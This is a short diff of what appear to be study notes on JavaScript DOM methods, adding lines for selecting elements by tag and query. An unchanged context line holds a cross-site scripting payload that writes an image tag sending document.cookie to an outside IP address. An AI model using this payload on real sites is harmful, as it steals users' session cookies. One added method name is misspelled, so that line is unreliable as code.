@@ -6,7 +6,9 @@
 > document.cookie
 >
 > document.getElementById('1');
->
+> document.getElementByTagName('div');
+> document.querySelectorAll('div');
+> 
 > document.write('something');
 > document.write('<img src="http://10.10.14.13/?'+document.cookie+'">');
 > 
